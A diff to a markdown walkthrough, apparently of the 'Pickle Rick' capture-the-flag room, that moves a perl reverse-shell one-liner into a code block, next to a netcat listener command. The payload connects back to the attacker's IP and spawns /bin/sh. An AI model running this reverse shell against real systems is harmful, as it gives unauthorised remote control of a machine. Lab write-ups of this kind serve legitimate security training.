@@ -56,7 +56,9 @@ In your machine start a netcat session:
 `nc -vnlp 9003`
 
 Then in the command panel, you can run this perl revshell (just change the IP to your VPN's IP):  
-`perl -e 'use Socket;$i="<yourIP>";$p=9003;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+```
+perl -e 'use Socket;$i="<yourIP>";$p=9003;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 
 ![Pickle-Rick](../Images/thm_pickle-rick_11.png)
 
